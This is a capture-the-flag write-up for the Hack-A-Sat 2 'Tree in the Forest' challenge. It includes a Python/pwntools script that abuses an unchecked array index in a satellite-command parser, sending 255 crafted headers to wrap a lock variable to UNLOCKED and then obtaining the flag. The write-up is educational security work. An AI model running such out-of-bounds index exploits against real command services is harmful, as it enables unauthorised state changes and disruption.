# Hack-A-Sat2: Tree in the Forest

## Description 

* **Category**: Rapid Unplanned Disassembly
* **Points**: 35 points
* **Description**:


```makefile
CC=g++-9.3.0

challenge: src/parser.c
    $(CC) src/parser.c -o $@
```

> Connect to the challenge on:
> `lucky-tree.satellitesabove.me:5008`
> 
> Using netcat, you might run:
> `nc lucky-tree.satellitesabove.me 5008`
>
> You'll need these files to solve the challenge.
> 
> * https://static.2021.hackasat.com/vca80g4d8hvxhpvebfh4ug3ntgck


## Solution

### Key Tactic

The key tactic to solve this challenge is to perform an integer overflow on the `lock_state` variable. The remote service provided accepts arbitrary values from the client. These values are parsed into a structure representing a "command header". One of these value, the `id`, is used to access a buffer, which can used to change values in memory. As such, solving this challenge involves sending multiple inputs to cause an overflow by leveraging the lack of validation on the `id` field.

The following modules and packages have been used for this challenge:
* **build-essentials**: contains the `g++` compiler needed to generate a local copy of the remote service;
* **python3**: use to generate a script to solve the challenge;
* **pwntools**: a utility module for CTFs. See my [tutorials](https://www.deepcode.ca/index.php/2017/07/28/exploit-development-with-afl-peda-and-pwntools/) for more information.

### Code Review

The first step is to generate a basic understanding of the logic of the remote service. In this case, the file provided by the challenge - `src/parser.c` - is the complete C source code of the remote service. By reviewing the code, we can identify the region of the code delivering the flag:

```c
switch(lock_state){
	case UNLOCKED:
		if (id == COMMAND_GETKEYS)
			return std::getenv("FLAG");
		else
			return "Command Success: UNLOCKED";
```

The flag is defined in the environment of the remote service. To access it, we need set the state of the service to be `UNLOCKED` and the value of the `header->id` needs to be set to `COMMAND_GETKEYS`. We therefore have to manipulate some values remotely to have the service to drop the flag.

The remote service listen to external connections via a regular UDP socket. The logic of managing remote connection is defined in the `server_loop` function. We can confirm that the remote service is listening on a UDP port as the [`socket`](https://man7.org/linux/man-pages/man2/socket.2.html) structure is generated using the [`SOCK_DGRAM`](https://man7.org/linux/man-pages/man2/socket.2.html) option and listening on port **54321/udp**. Therefore to connect to the service, we need to setup a UDP socket to connect on port 54321 of the remote service.

```c
	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}

	memset(&servaddr, 0, sizeof(servaddr));
	memset(&cliaddr, 0, sizeof(cliaddr));
	servaddr.sin_family    = AF_INET; // IPv4
	servaddr.sin_addr.s_addr = inet_addr("0.0.0.0");
	// servaddr.sin_port = htons(std::atoi(std::getenv("CHAL_PORT")));
	servaddr.sin_port = htons(54321);
```

As in most challenges, there is a timer that closes the socket after a specific amount of time, which is specified by the `TIMEOUT` environment variable. This is important as when developing the solution, we will want to disable this timeout. In this case, this will be trivial by defining this variable in our local environment.

```c
const char *timeout_value = std::getenv("TIMEOUT");
```

### Basic Testing

With a basic understanding of the program, we will now compile it and run it with some random inputs to have a general idea of how it works. I did not have version 9.3 of `g++` on my host, but I was able to compile the `parser.c` file using version `10.2.1 20210110`. The description of the challenge provides a `Makefile`. To compile the code, either use the `Makefile` provided or the following command:

```sh
$ g++ ./src/parser.c -o challenge
```

To test the service without being timed out every minute, we'll set the `TIMEOUT` environment var to 1 hour, i.e. 3600 seconds:

```sh
$ TIMEOUT=3600 ./challenge 
Trying to bind to socket.
Bound to socket.
```

At this point, we have the service boung to port **54321/udp** on our local host. Let's use `nc` to connect to it:

```sh
$ nc -u 127.0.0.1 54321
1111
Invalid length of command header, expected 8 but got 5
```

As expected, the service accepts inputs on port **54321/udp.** There are no prompt provided once connected, but if we type some string, we get an error message stating that the service expects a _command header_ of _length_ 8. So trying again with 8 characters, we get a bit further:

```sh
11111111
Command header acknowledge: version:12593 type:12593 id:825307441
Invalid id:825307441
```

Based on a very basic experimentation, a string of 8 characters will be accepted by the remote service as a _command header_. As such, the next steps involves figuring out which values to send to unlock the flag.

### Crafting the Command Header

By reviewind the definition of the `command_header` structure, we notice that three (3) values are needed: two (2) short integers and one `command_id_type` type, which is an `enum` of one (1) `integer`, for a total of 64bits, i.e. eight (8) byte(s):

```c
typedef enum command_id_type {
	COMMAND_ADCS_ON = 		0,
	COMMAND_ADCS_OFF =		1,
	COMMAND_CNDH_ON =		2,
	COMMAND_CNDH_OFF =		3,
	COMMAND_SPM =			4,
	COMMAND_EPM =			5,
	COMMAND_RCM =			6,
	COMMAND_DCM =			7,
	COMMAND_TTEST =			8,
	COMMAND_GETKEYS =		9, // only allowed in unlocked state
} command_id_type;
...
typedef struct command_header{
	short version : 16;
	short type : 16;
	command_id_type id : 32;
} command_header;
```

At this point, we have all the knowledge needed to craft a command header, so let's write a basic _Python_ script to send valid headers to the service. Below is the initial code used for sending a legitimate command header:

```python
def do_challenge(remote):
    flag = bytearray()
    flag += struct.pack('HHi', 1, 1, 9)
    remote.sendline(flag)
    line = remote.recv().decode('utf-8')
    print(f"[*] << {line.rstrip()}")
```

If not already done, launch the `challenge` service and execute this script to send our command header of 8 bytes, i.e. two shorts of 16 bites: 1 and 1, and an interger of 32 bits - 9 - which is the `COMMAND_GETKEYS` id: 

```sh
$python quick.py 
[+] Opening connection to 127.0.0.1 on port 54321: Done
LOG: %r Command header acknowledge: version:1 type:1 id:9
Command Failed: LOCKED
[*] Closed connection to 127.0.0.1 port 54321
```

We were able to send a legitimate command header, but the state of the service is still **LOCKED**. Obviously it wasn't going to be THAT easy. After another review of the code, you will quick notice that there isn't any logic to update the state of the service to **UNLOCKED**. As such, we have to devise a way to forcefully update the value of the `lock_state` variable.

You should notice that the code provided contains commented lines. It is easy to go over these comments, but they actually provide some useful insight to the next steps:

```c
//	fprintf(stderr, "Address of lock_state:       %p\n", &lock_state);
//	fprintf(stderr, "Address of command_log: %p\n", &command_log);
```

When uncommented, these will display the addresses of both the `lock_state` variable the the start of the `command_log` buffer. This should bring your attention to the `command_log` buffer:

```c
	// Log the message in the command log
	command_log[header->id]++;
```

The code reviewer should notice the lack of boundary check. The value provided by the `header->id` will be use as index for the `command_log` buffer. While we cannot use this oversight to run arbitraty code here, we can leverage it to increment values at almost any memory location within the service. We can leverage this ability to generate an integer overflow on the `lock_state` variable. When overflowed to `0`, the `lock_state` will become **UNLOCKED**.

### Integer Overflow

The initial state of the service is set to be **LOCKED**. As such, the `lock_state` variable starts with a value of `1`. Because variables [types](https://en.cppreference.com/w/cpp/language/types) are bound by their size, continuously incrementing them will eventually cause them to have a value of `0`. For example, an `unsigned char` can have a value between 0 and 255. Incrementing an `unsigned char` variable with a value of 255 will cause it to rollover back to 0. At this point, we have to figure out how to cause an overflow on the `lock_state` variable using the `header->id` and `command_log` variables.

```c
unsigned int lock_state;
char command_log[COMMAND_LIST_LENGTH];
...
int main() {

	lock_state = LOCKED;
...
```

Clearly, we can use the `command_log` buffer to increment the `lock_state` variable. Since `header-id` is not validated, we can use it to reference the address of the `lock_state` variable. To better understand this part, refer to (Pointer arithmetic and array indexing)[https://www.learncpp.com/cpp-tutorial/pointer-arithmetic-and-array-indexing/] which explains pointers and offsets in memory. To perform this operation, we will need to know the address of the `command_log` and `lock_state` variables.

To obtain the memory addresses of both the `lock_state` and `command_log` variables, we will uncomment the lines identified earlier and recompile the service. We will then re-run the `challenge` service, which will display their location:

```c
	fprintf(stderr, "Address of lock_state:       %p\n", &lock_state);
	fprintf(stderr, "Address of command_log: %p\n", &command_log);
	// fprintf(stderr, "Port: %d\n", std::atoi(std::getenv("CHAL_PORT")));
```

```sh
$ TIMEOUT=3600 ./challenge 
Address of lock_state:       0x55dd5458c130
Address of command_log: 0x55dd5458c138
Trying to bind to socket.
Bound to socket.
```

From the output above, we can observe that the address of the `lock_state` variable is 8 bytes before the start of the `command_log` buffer. Since the buffer contains `signed char` values, we need to access `command_log[-8]` and increment the value 255 times (1+255=256) for it to overflow to `0`, which is the value for the `UNLOCKED` state.

Let's go step-by-step to demonstrate the concept. We will first show that we can modify the `lock_state` variable by accessing it via the value of the `header->id` variable. This can be done by sending a command header with an id of `-8`

```python
def do_challenge(remote):
    flag = bytearray()
    flag += struct.pack('HHi', 1, 1, -8)
    remote.sendline(flag)
    line = remote.recv().decode('utf-8')
    print("LOG: %r", line.rstrip())
```


```sh
$python solve.py 
[+] Opening connection to 127.0.0.1 on port 54321: Done
LOG: %r Command header acknowledge: version:1 type:1 id:-8
Command Success: LOCKED
[*] Closed connection to 127.0.0.1 port 54321
```

It seems that the service accepted our ID with a value of `-8`. We will use `gdb` yo confirm that the `lock_state` variable changed. To do so, we will attach `gdb` to the `challenge` process:

```sh
ps -e | grep challenge
1350693 pts/4    00:00:00 challenge
$gdb -p 1350693
```

We can then look at the value of the variable using the `p` command of `gdb`. Note that the `lock_state` variable must be casted into an `unsigned int` to avoid GDB from complaining:

```gdb
(gdb) p (unsigned int)lock_state
$1 = 2
```

We were able to update the `lock_state` via the `header->id` value of our command header. As you can see, the value `lock_state` is now `2`, meaning that we were able to change its value when using `-8` as the ID of the header. Because we are incrementing the variable through a buffer of `signed char`, incrementing the value a total of 255 times will cause it to roll over to `0`, causing the integer overflow. To do so, well modify out script to send 255 command headers with an id of `-8`, causing the value of the lock_state to be `0`, i.e. **UNLOCKED**. We will then follow with one additional command header using the `COMMAND_GETKEYS` id:

```python
def do_challenge(remote):
    overflow = bytearray()
    # Create a bytearray of 1, 1 and -8
    overflow += struct.pack('HHi', 1, 1, -8)
    
    # Send 255 headers to overflow the `lock_state` to 0
    for i in range(1, 256):
        remote.sendline(overflow)
        line = remote.recv().decode('utf-8')
        print(f"[*] << {line.rstrip()}")

    # Create the command header to get the flag
    flag = bytearray()
    flag += struct.pack('HHI', 1, 1, 9)
    remote.sendline(flag)
    # Bring home the flag
    while remote.can_recv(1):
        line = remote.recv().decode('utf-8')
        print(f"[*] << {line.rstrip()}")
```

Close the `challenge` service and restart it, this time providing a dummy flag using the `FLAG` variable environment:

```sh
$ FLAG=flag{this-is-not-a-flag} TIMEOUT=3600 ./challenge
```

And now running our _Python_ solving script, we should unlock the flag:

```sh
[*] << Command header acknowledge: version:1 type:1 id:-8
Command Success: LOCKED
[*] << Command header acknowledge: version:1 type:1 id:-8
Command Success: UNLOCKED
[*] << Command header acknowledge: version:1 type:1 id:9
flag{this-is-not-a-flag}
[*] Closed connection to 127.0.0.1 port 54321
```

Lastly, we'll confirm our tactic by using our solver script against the real challenge:

```sh
...
[*] << Command header acknowledge: version:1 type:1 id:-8
Command Success: UNLOCKED
[*] << Command header acknowledge: version:1 type:1 id:9
flag{whiskey62427oscar2:GJNFiQHT5mvthY0W4oCIPa6zAoOP6NuSdY0H8Rgg8k6Eua4l...}
[*] Closed connection to 18.118.161.198 port 17434
```

Mission accomplished.

## Conclusion

This is a great example of the exploitation of the [CWE-190: Integer Overflow](https://cwe.mitre.org/data/definitions/190.html) vulnerability. It's not unusual for various sub-systems in a satellite to use control variables to specify a mode of operation or a state. While not malicious and caused by a bad conversion, the [Ariane 5, Flight 501](https://www-users.math.umn.edu/~arnold/disasters/ariane5rep.html) incident in a notorious space-related example of a onverflow leading to catastrophic failure. Having the ability to modify these can cause Denial of Service (DoS) by forcing it into a constant emergency state or causing a major disruption by stowing the solar panels for example.

## Contact

* Jon Rasiko, [support@deepcode.ca](mailto:support@deepcode.ca)
* [www.deepcode.ca](https://deepcode.ca)